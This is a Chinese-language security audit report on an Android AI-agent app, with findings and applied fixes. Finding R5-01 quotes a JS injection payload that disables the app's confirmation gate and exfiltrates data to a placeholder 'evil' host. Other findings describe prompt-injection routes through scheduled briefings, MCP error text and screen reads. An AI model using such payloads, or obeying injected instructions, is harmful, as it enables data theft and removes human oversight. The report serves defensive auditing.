# 安全审计报告 · 第五轮 — NailongClaw

> 审计日期：2026-11-22。基线：当前 HEAD `45c9e5f`（v0.9.1，versionCode 63），对比基准 `c713b6d`（R4 修复轮首提交）。
> 范围：R4（2026-10-27）以来落地的全部代码（380 文件，+11,404/-2,429）+ R4 遗留项现状盘点。
> 方法：五域并行走查（外部入口与权限面 / WebView 与 JS 桥 / 影子屏与 MediaProjection / 数据落盘·网络·密钥 / 工具面与提示注入），关键发现逐条人工复核源码定位。
> 前轮：`SECURITY_AUDIT.md`(R1)、`_R2.md`(F1–F10)、`_R3.md`(R3-01..11)、`_R4.md`(+`_BLUE`/`_RED_RUNBOOK`)。
>
> **诚实边界**：本轮为静态源码审计 + git 历史交叉验证，无动态 PoC。可利用性结论均为「代码路径成立」；
> 攻击场景按 R4 的口径描述触发条件，真机负路径复验留待修复落地后按 QA_CHECKLIST 执行。

---

## 0. 一句话结论

R4 的全部修复（R4-R1 令牌门控、R4-B1 数据条款、ExternalAutomationGuard、SCHEDULED 天花板、WebActivity 白名单）在 HEAD **无回归**；R4 之后新增的代码面里发现 **2 个 P1、7 个 P2**——最高的一条是主界面 WebView 的 QA 广播接收器被运行时导出 + JS 拼接未转义，任意 app 可借它接管整个桥面。

> **2026-11-22 更新**：§8 第 1–3 组修复已全部落地（见 §9），全量单测 749/0；仅 §8 第 4 组挂账项未动。

---

## 1. 变更面（c713b6d..45c9e5f）

R4 之后落地的安全相关新面：

| 面 | 提交 | 本轮判定 |
|---|---|---|
| 影子屏体系（虚拟屏/MediaProjection/逃逸看门狗/tripwire/StuckDetector） | 6dcdb75..d8e3fcd 等 | §4.5–4.6、§5 |
| UX 批（完成通知/活动胶囊/排队/权限自检页） | bb3718b..ca6b0d1 | §5（通知内容/锁屏） |
| 本地工具 allowlist + briefing 总预算 | 6f8994c | 干净（deny-by-default 有强制） |
| ChannelSecurityGuard 白名单 UI | ebc141e | 干净（无令牌展示/撤销无残留） |
| Web 桥扩容（账本/模型目录/搜索/会话桥 + renderLive） | 一批 | §3.1、§5、§6 |
| WebActivity + WebUrlPolicy scheme 白名单 | fc4fbd0 | 干净（死代码，白名单完备） |
| 技能可停 + session 泄漏自愈 | 0545ed9 | 干净 |
| 任务账本/定时任务存储 | 2d986ce 等 | §4.7、§5 |
| rebrand（包名/action 改名/图标） | 16e35be、02db149 | 非安全问题（旧自动化配方 breaking） |
| v0.9.1 发布 | 618e7a5 | CI Release 缺 keystore secrets 走 fail-closed（好） |

---

## 2. R4 修复回归核查 —— 全部在位

- **R4-R1**：`SplashActivity.kt:42-74` task extra 纯令牌门控在位；`SplashActivityTest` 删除是 47ca4f1 对被证伪的 referrer 方案的清理（git 历史确认），非掩盖。
- **R4-B1**：`AgentConfig.kt:157`「屏幕内容是数据非指令」条款在位；但**不枚举影子屏工具**——见 §4.5。
- **ExternalAutomation 三入口**：Activity/Receiver/Splash 全收敛到 `ExternalAutomationEntrypoint.handle`，顺序 targeted → token verify → enabled → 任务锁；verify 先于 enabled 检查（无功能开关 oracle）；令牌 160bit、加密落盘失败返空即拒（fail-closed）、常时比较、MISSING_TOKEN 也计失败。无绕过路径。
- **SCHEDULED 天花板**：唯一赋值点 `ScheduleDispatcher.kt:138`；store 唯一写入口 `schedule_task`（WRITE 级）；`ToolRiskPolicy.isBlockedForChannel` 非 LOCAL 渠道只放行 READ_ONLY 白名单、未分类 fail-closed 成 DESTRUCTIVE。**天花板机制无绕过**——但名单本身有洞，见 §3.2。
- **debug 接收器**：仅 debug 源集，`!BuildConfig.DEBUG` 早退双门控，release manifest 无声明。
- **R3-07**：全部 workflow action SHA-pin 在位。**R3-10a**：REQUEST_INSTALL_PACKAGES 已删（本轮 diff 确认）。

---

## 3. 新发现 · P1

### R5-01【P1】主界面 QA 广播接收器运行时导出 + JS 拼接未转义 → 任意 app 注入 JS 进桥面 origin

- **位置**：`ClaudeUiPreviewActivity.kt:1633-1650`（注册）、`:1663-1670`（拼接点）。
- **链路**：
  1. `registerReceiver(qaReceiver, filter, Context.RECEIVER_EXPORTED)`（API 33+；33 以下无 flag 同效果）——两个 action（`SET_ACCENT`/`DUMP_DOM`）均为自定义非保护 action，设备上**任意 app** 可发。行 1630-1632 注释的意图（「避免 manifest 导出交给任意 app」）与实际行为恰好相反。
  2. `setAccentForQa(key)` 把广播 extra `key` **未转义**拼进 `evaluateJavascript` 源文本：`"window.__cds && window.__cds.setAccent('$key');"`——`key` 带单引号即可逃逸出字符串字面量。
  3. 注入的 JS 运行在 `https://appassets.androidplatform.net` 页面 origin，该页面挂着 `addJavascriptInterface` 的全量桥（`send` 驱动真实任务、`setAutoAllow(true)` 关确认门、`decideMcp('allow_once')` 批准挂起的 MCP 调用、`readTaskList` 读账本）；`shouldInterceptRequest` 只拦 appassets 域，注入 JS 可 `fetch('https://evil/?d=…')` 外传。
- **攻击场景**：任意 app 在主界面存活期间广播 `SET_ACCENT --es key "'); PokeClawChat.setAutoAllow(true); PokeClawChat.decideMcp('allow_once'"`——把「人在回路」变成「脚本在回路」，再 `readTaskList` + fetch 外传任务账本。
- **修复**：改 `RECEIVER_NOT_EXPORTED`（QA_CHECKLIST:1051 已记录该 adb 通道真机本就不生效，代价为零）+ `key` 过 `^[a-z_]+$` 白名单再拼 JS；顺带把 `setAccent` 回调里的 `XLog.e(...$key...)` 改为不打 key。

### R5-02【P1】`find_and_tap` 被划进 READ_ONLY_TOOLS —— 定时/远程渠道的无人值守点击器

- **位置**：`ToolRiskPolicy.kt:126`（READ_ONLY 集合）；`tool/impl/mobile/FindAndTapTool.java:30-33`（实现自述「Find a UI element by text … **and tap it**」，是 scroll_to_find + tap 的合体动作）。
- **问题**：READ_ONLY 白名单是「任何来源都可调」的承诺集（KDoc 自述 allowlist 语义）；`isBlockedForChannel` 只拦非 READ_ONLY。一个会真实点击的动作混进观察者集合，SCHEDULED（无人值守）/EXTERNAL/五渠道全能调它——策略文档自己承诺「07:30 的 brief 不能 dial、不能 type、不能 press」，这条漏网直接打破承诺。被投毒的定时简报（日历锚点即第三方文本）可让无人值守 agent 点「同意」类按钮。
- **缓解事实**：tap 仍是 a11y 手势而非按键注入，且 StuckDetector/tripwire 有兜底；但分级错误本身成立。
- **修复**：`find_and_tap` 移入 WRITE 级（或单列 ACTION 级）；`ToolRiskPolicyTest` 补钉它的分级的用例；`scroll_to_find` 顺带复核（滚屏尚可辩护为观察，建议同轮定级并写明理由）。

---

## 4. 新发现 · P2

### R5-03 任务被系统对话框阻塞时，自动截真屏整幅画面外发任务来源渠道，不经风险门

- **位置**：`TaskOrchestrator.kt:735-757`——`SYSTEM_DIALOG_BLOCKED` 分支发文案后 `service?.takeScreenshot(5000)`（DEFAULT_DISPLAY）→ PNG → `ChannelManager.sendImage(blockedChannel, …)`；`blockedChannel` 可为远程渠道。
- **问题**：全仓库唯一把屏幕位图主动送出设备的路径，不走 `ToolRegistry` 风险门、无确认。触发器可被第三方 app 诱导（铺 FLAG_SECURE/不可读覆盖层即可制造「阻塞」）；截屏内容是**用户屏幕当时的完整画面**，去向是任务的来源会话（若配对的是共享群组，即向第三方泄露）。
- **修复建议**：默认只回传「被阻塞」文案；截图改为需要用户显式要求（或仅 LOCAL 渠道 + 明确提示），落盘/外发前不保留副本。

### R5-04 `open_app` 链式弹窗处理盲点 `android:id/button1`，不校验文本与来源

- **位置**：`OpenAppTool.java:38-51`（POSITIVE_BUTTON_IDS 含 button1/permission_allow 系列）、`:191-204`（`tapPositiveDialogButton` 只看可见+可点即点击，无文本检查；`ALLOW_KEYWORDS` 定义了却没参与该判定）。
- **场景**：本地任务调 open_app 时恰逢前台出现任意 AlertDialog（卸载/清除数据/授权确认多用 button1），1.5-1.8s 的 settle 窗口内被无差别点「确定」。缓解：open_app 未分类 → DESTRUCTIVE，远程/定时渠道被拒，仅 LOCAL 可达。
- **修复建议**：限定弹窗判定（包名 == 目标 app 或匹配链式启动拦截弹窗的特征）+ 点前比对文本 ∈ ALLOW_KEYWORDS。

### R5-05 MCP 错误文本未围栏进模型上下文

- **位置**：`McpTool.kt:90-103`——成功结果走 `ContextFence.wrap`，`catch` 分支 `ToolResult.error("… ${e.message}")` 裸奔；`e.message` 来自远端服务器错误正文（`McpStreamableHttpClient.kt:116,207-209`）。
- **场景**：恶意 MCP 服务器在错误响应体里夹指令，绕过 description sanitize 与结果 fence 两道既有防线。
- **修复**：错误文本同样过 `ContextFence`（或至少截断 + 剥围栏标记形状）。

### R5-06 `Route.DirectIntent` 分支完全绕过 ToolRiskPolicy 渠道门

- **位置**：`TaskOrchestrator.kt:374-386`——`pipelineRouter.executeIntent(route.intent)` 无任何 channel/risk 检查；`TaskParser.kt:65,131,217` 从任务文本正则产出 ACTION_DIAL / ACTION_SENDTO / ACTION_VIEW。同语义的 `send_message` 工具路径会被渠道门拒，这条旁路不拒。
- **场景**：定时任务/远程消息说「call 138…」「open https://evil」→ 无人值守在真屏拉起预填拨号盘/外部 URL（不自动拨出，但无人值守 UI 动作 + 策略对等性破缺）。
- **修复**：`executeIntent` 前过 `isBlockedForChannel`（SCHEDULED/EXTERNAL 直接拒或降级为提示）。

### R5-07 影子屏读屏未围栏，且 R4-B1 数据条款不点名 shadow_* 工具

- **位置**：`ShadowGetScreenInfoTool.java:83`（树文本原样返回，无 `ContextFence.wrap`，真屏 `GetScreenInfoTool.java:71` 同）；`AgentConfig.kt:157` 条款枚举的工具清单（get_screen_info/find_node_info/scroll_to_find/read_conversation/get_notifications/web_search）**不含任何 shadow_***。
- **判定**：与 R4-B1 的既定设计决策一致（围栏会破坏读屏，防线走提示词条款）——不是新开绕过通道，故定 P2 而非 P1；但影子屏是 R4 之后的新通道，条款枚举缺口使软覆盖对它是「靠文档声明」而非「靠字面点名」。云端路径会声明 shadow 工具（LocalToolAllowlist 只裁 LOCAL）。
- **修复**：`AgentConfig.kt:157` 枚举补上 `shadow_get_screen_info`（及影子读屏变体）；若日后给屏幕读取补围栏，影子树必须随真屏树一并纳入。

### R5-08 删除会话不清 SQLite 消息正文——`deleteConversation` 全仓零调用

- **位置**：`ChatDatabase.kt:143-147`（删除函数已写好）**无调用者**；两条删除路径（`ConversationStore.kt:91-93`、`ClaudeUiPreviewActivity.kt:565-578`）都只删 markdown 文件。`ChatDatabase.kt:55-82` 把全部消息正文明文写进 `messages` 表且只增不减。
- **场景**：用户删掉敏感会话后，正文仍可被 `search()` 命中；换机/送修导出 `pokeclaw.db` 即恢复「已删除」对话。对审了三轮屏幕内容留存的应用，「删除不删内容」比库膨胀更锋利。
- **修复**：一行接线（删除路径调 `deleteConversation`）；别拿文件名当键（`ChatHistoryManager` 现以 conversationId 为主干，正好接得上）。

### R5-09 LAN 控制台明文 HTTP：POST 请求体与 PIN 头裸奔（F5 残余，GET 侧已修完）

- **位置**：`network_security_config.xml:3`（全局 cleartext 放行）+ `ConfigServer.kt:33`（0.0.0.0 明文监听）。GET 的 token/apiKey 已全部 `maskIfPresent` 掩码（16e35be 引入，`ConfigServer.kt:286-396`），POST 掩码值不覆盖真值——**回读侧已闭环**；残余是 POST 新 token 明文上行 + `X-Config-PIN` 头明文。被动嗅探一次即得 6 位 PIN（兼作渠道配对码）→ LAN API 全权。
- **状态**：R3 起已知有意残余（WeChat/QQ/抖音网关用户可配 http/ws，不能全局收紧）。维持 P2，收敛路径不变：控制台自签 TLS + 指纹固定。

---

## 5. 新发现 · P3（按域）

**凭据与落盘**
- 配对 PIN 明文存 MMKV（`ChannelSecurityGuard.kt:119-131`）——bot token/LLM key 都走 SecretBox 加密，PIN 是唯一没走的凭据，而它同时是 LAN 控制台凭据。
- 任务账本/定时任务/记忆明文 JSON 落 `getExternalFilesDir`（`TaskRecordStore.kt:429-439` 等）——adb-pullable，属文档化设计取舍（无令牌入库，已核）。
- 截图残留：影子/真屏截图写 `cacheDir/screenshots` 无清理策略（`ShadowGetScreenInfoTool.java:90-96`、`TakeScreenshotTool.java:55-64`），FileProvider cache-path 根覆盖该目录。

**日志泄露（release 的 AppLogStore 随报告 ZIP 离机）**
- `ChannelSecurityGuard.kt:423,427,453` verify() 打全量 senderId + 消息前 60 字符，与同文件 `redactId` 自律矛盾。
- `MemoryStore.kt:436,423,380` memory_save 打记忆正文前 40 字符。
- `TaskOrchestrator.kt:377,426,637` 全文打 `answer=`、`PipelineRouter.kt:52`/`SkillRegistry.kt:78` 全文打任务原文（存量，非本轮新增）。
- http_logs 全量落盘含会话正文、ZIP 打包只擦凭据形状（`LlmClientFactory.kt:14-16`、`DebugReportManager.kt:218-227`）——已知取舍，建议导出前加显式确认。
- `ErrorHumanizer` 原文直通 UI/账本/通知（`TaskFlowController.kt:612-619` 等）——provider 报错若含带 key 的 URL 会全链路扩散；建议复用 `HeaderMask.scrubText`。

**通知隐私**
- `TaskOutcomeNotifier.kt:102-140`（与 `ScheduleDispatcher.kt:212-231` 同构）：通知正文带 answer/error/taskText 原文，未显式 `setLockscreenVisibility`（默认 PRIVATE 但建议显式钉死 + 锁屏降级为「任务已结束」）。

**MCP 面**
- `McpConfirmationCoordinator.kt:144-149` autoAllow 在状态判定前直接放行、不区分 risk tier——旁路了 `McpConfirmationGate.kt:158-169`「DESTRUCTIVE 永不记住式放行」的不变量（设置项有警告文案，建议 autoAllow 对 DESTRUCTIVE 仍走确认）。
- `McpDescriptionSanitizer.kt:33-41` 指令模式只识别英文——中文指令走私全绿通过（本 app 中文优先）。
- `McpTool.kt:126` 显示名（远端原始工具名）未 sanitize 上确认卡并进转写。

**入口与传输**
- `ConfigServer.kt:163-164` PIN 为空时 `authenticate` 返回 true（fail-open 方向反了）。已核实正常路径不可达：`getPairPin()` 自动 mint、UI 强制 6 位、无 LAN 设 PIN 端点——仅 MMKV 写失败可达；仍应改 return false。
- `SplashActivity.kt:70-74` 令牌失败落共享锁定键（`ExternalAutomationGuard.kt:188-189`）——恶意 app 可把无 return_package 的合法自动化锁出 30s-30min（可用性 DoS，重启清零）。
- `KVUtils.kt:106-108` 读路径对存量明文 fail-open，与 Guard KDoc 宣称的 fail-closed 语义不一致（无伪造收益，记录备查）。

**Web 面（纵深）**
- `decideMcp` 无一次性 nonce（`ClaudeUiPreviewActivity.kt:423-436`）——任何进入 origin 的 JS 都能在 60s 窗口内盲拍确认；R5-01 修后建议加 nonce。
- 页面 origin 无子资源网络隔离（`shouldInterceptRequest:1413-1422` 只拦 appassets）——建议非 appassets 域返回空 response，把「页面永不触网」从注释变成强制。
- 主桥前提条件：桥面防护全靠「页面只来自本地 asset」（导航全禁）——建议桥入口加 origin 断言；WebActivity 将来接线时需补 host 白名单。

**影子屏兜底链**
- 逃逸判定对主屏不可读 fail-open（`ClawAccessibilityService.java:1053-1055`）+ 拉回失败只附警告不停止——有 tripwire/StuckDetector 兜底链（可接受，记录）。
- `search_app_in_store` 在 READ_ONLY 但未注册（死登记，预分类模式）。

---

## 6. 已核干净面（本轮确认，无新问题）

- **Manifest/入口**：全部 exported 组件逐一核对；`TaskAlarmReceiver` exported=false + 显式 PendingIntent + FLAG_IMMUTABLE；BootReceiver 无外部输入；ChannelPairActivity/WebActivity 等全 exported=false。新增权限仅 FOREGROUND_SERVICE_MEDIA_PROJECTION（配 FGS type 同步）。
- **Web 桥**：renderLive/TaskChips/Schedules/会话列表 全 textContent + JSON 转义（U+2028/29 处理到位），innerHTML 只填静态骨架——**无 XSS**；WebSearchBridge 密钥只出布尔、snippet 过 stripTags+ContextFence；ClaudeUiSessionBridge 正文不设主动读桥面；桥面无令牌明文日志。
- **WebUrlPolicy**：默认拒绝、畸形全拒、redirect 复检——完备。
- **渠道白名单 UI**：列表无令牌、撤销无服务端残留（授权本就纯本地判定）、待重绑徽标不参与 verify。
- **allowlist**：deny-by-default（未列即不声明）、编译期固定无开关可关、被裁工具诚实拒绝不假成功；LOCAL 模式 mcp_* 全裁。
- **briefing**：截断只发生在注入侧、单条自身前缀、经 ContextFence.sanitize 防记忆投毒。
- **MediaProjection**：授权仅用户点击一处、授权后唯一能力是建影子屏、帧即排即关永不持久化、撤权即 release（带 stale-projection 身份校验）。
- **displayId 隔离**：影子树只走 windowsOnDisplay、手势全 setDisplayId、nodeId 双 map 防串屏、影子事件不喂 AutoReplyManager——无真/影混用路径。
- **影子输入不可外部触发**：5 个 shadow_* 全部未分类 → DESTRUCTIVE fail-closed；无 injectInputEvent；JS 桥 send 固定 Channel.LOCAL；RepeatActionsTool 逐条过风险门。
- **看门狗不可被 agent 停**：无工具可达 release()/setShadowTaskPackage(null)，销毁入口仅用户手动与投影回调。
- **技能面**：SnakeYAML 2.2（CVE-2022-1471 形态消除）、SkillTrigger 防 ReDoS、技能写入唯一入口是捕获编辑器 UI（无 agent 可达写路径）、步骤走 executeTool 渠道门生效。
- **StuckDetector/tripwire**：循环局部实例无 reset 旁路；tripwire 纯固定文本。
- **网络**：无新增端点；LLM/模型下载均 HTTPS；HostPolicy 域名拒绝在位；全仓未发现 token/key 明文日志值。
- **语义检索 sidecar（分支预审）**：纯本地推理无远端发送；合并前需补模型 SHA-256 校验（现仅 ±5% 大小容差）。

---

## 7. R4/R3 遗留状态（本轮逐一核实）

| 项 | 级 | 状态 |
|---|---|---|
| F3 逐调用方签名白名单 | P1(backlog) | **仍开**——等 Tasker/MacroDroid 迁移决策 |
| F5 LAN 明文传输 | P2 | **仍开**（GET 掩码已闭环，POST/PIN 头残余=R5-09） |
| R3-06 依赖 verification-metadata | P2 | **仍开**（无该文件；wrapper 哈希已修） |
| R3-07 CI action pin | P2 | **已修**（全 SHA-pin）；cla.yml `pull_request_target` 结构仍在（动作 pinned，残余维持原判） |
| R3-08 发布哈希展示 | P3 | **仍开**（UpdateChecker 直弹浏览器） |
| R3-09 签名口令明文 | P3 | **仍开**（local.properties，未入库） |
| R3-10a 死权限 | — | **已修**（REQUEST_INSTALL_PACKAGES 已删） |
| R3-10b JitPack 依赖 | P3 | **仍开**（ok2curl/EasyFloat 仍在） |

另：README.md:40 的「端上 EmbeddingGemma 混合打分」在 HEAD 不成立（实现在 feat/memory-semantic-ranking 分支，未合入）——文档漂移，合并或改文案。

---

## 8. 修复优先级建议

1. **立即**：R5-01（NOT_EXPORTED + 白名单转义，改动 ~10 行）；R5-02（分级 + 测试钉住）。
2. **本迭代**：R5-03（截图外发改确认制）、R5-05（MCP 错误围栏）、R5-06（DirectIntent 过渠道门）、R5-08（删除接线，一行）、R5-07（条款枚举补名）。
3. **顺手**：R5-04 弹窗限定、PIN 空 fail-open 改向、autoAllow 对 DESTRUCTIVE 例外、通知 scrub+visibility、错误文本 scrubText、日志脱敏四处。
4. **挂账**：R5-09/F5 自签 TLS、F3 迁移决策、R3-06/08/09/10b 维持原判。

---

## 9. 修复落地（2026-11-22，同日）

按 §8 第 1–3 组全部落地。编译 + 全量单测 **749/0**（较上轮 +3，全部是本轮新增的分级/不变量钉），`.auto/r5_test.log` EXIT=0。改动未提交。

| 项 | 改动 |
|---|---|
| R5-01 | `ClaudeUiPreviewActivity.kt` — QA 接收器改 `RECEIVER_NOT_EXPORTED`（注释同步改真话）；`key` 过 `^[a-z][a-z-]*$` 白名单（覆盖 `clay-bright`）再拼 JS；日志不再回显 key |
| R5-02 | `ToolRiskPolicy.kt` — `find_and_tap` 显式进 DESTRUCTIVE_TOOLS（与 `tap` 的 fail-closed 归级一致）；`scroll_to_find` 留 READ_ONLY 并写明理由；`ToolRiskPolicyTest` 新增分级回归钉 |
| R5-03 | `TaskOrchestrator.kt` — 删除阻塞分支的自动整屏截图外发（LOCAL 本就是 no-op，实际只有远程渠道收图）；文案通知保留 |
| R5-05 | `McpTool.kt` — 错误文本与成功结果同过 `ContextFence.wrap` |
| R5-06 | `TaskOrchestrator.kt` — DirectIntent 分支执行前过 `isBlockedForChannel`（intent action 恒非 READ_ONLY → 无人值守来源全拒），拒绝文案走 `blockReason` |
| R5-07 | `AgentConfig.kt` — 数据条款枚举补 `shadow_get_screen_info` |
| R5-08 | `ChatHistoryManager.delete(context, file)` — 删文件后按 **frontmatter id**（非文件名）清 SQLite 索引的 messages+conversations 行；两个调用方（Compose 侧栏 / Web 面）同步改签名 |
| R5-04 | `OpenAppTool.java` — button1 命中后必须再过 `matchesAllowButton`（text 或 contentDescription）才点击 |
| 顺手① | `ConfigServer.kt` — 空 PIN `authenticate` 改 fail-closed |
| 顺手② | `McpConfirmationCoordinator.kt` — autoAllow 对 DESTRUCTIVE 仍出卡（`McpConfirmationCoordinatorTest` 新增 2 钉） |
| 顺手③ | `TaskOutcomeNotifier.kt` + `ScheduleDispatcher.kt` — 通知文本过 `HeaderMask.scrubText` 再截断；渠道显式 `setLockscreenVisibility(PRIVATE)` |
| 顺手④ | `TaskFlowController.kt` / `ChatSessionController.kt` / `TaskRecordStore.kt` — 失败原文过 `scrubText` 再进 UI / 转录 / 账本 |
| 顺手⑤ | 日志脱敏：`ChannelSecurityGuard`（senderId 全改 `redactId`、消息体只留长度）、`MemoryStore`（记忆正文 4 处改长度）、`TaskOrchestrator`（`answer=` 3 处改 `answerLen`）、`PipelineRouter` / `SkillRegistry`（task 全文改长度） |

行为取舍（记录在案）：

- **R5-03** 之后远程渠道用户拿不到阻塞截图——`take_screenshot` 是 READ_ONLY 可返回路径文本，但 `send_file` 是 WRITE 不可外发，要看屏得回真机。取报告建议的安全侧。
- **顺手②** 之后「自动允许操作」开关对 DESTRUCTIVE 级 MCP 工具不再生效——与确认门「破坏级永不整体放行」不变量对齐；当前 `mcp_*` 恒为 DESTRUCTIVE，即该开关现在对 MCP 面全量出卡。设置页警告文案建议同步更新（未在本轮改）。
- **顺手⑤** 把三处任务/答案全文日志改为长度——QA 诊断损失原文可读性，换调试报告 ZIP 不再携带会话/任务内容。
- 未修（挂账维持原判）：R5-09/F5 自签 TLS、F3 签名白名单、R3-06/08/09/10b；§5 其余 P3（PIN 明文 MMKV、截图 cache 残留、decideMcp nonce、sanitize 只识英文、看门狗 null fail-open 等）待排期。
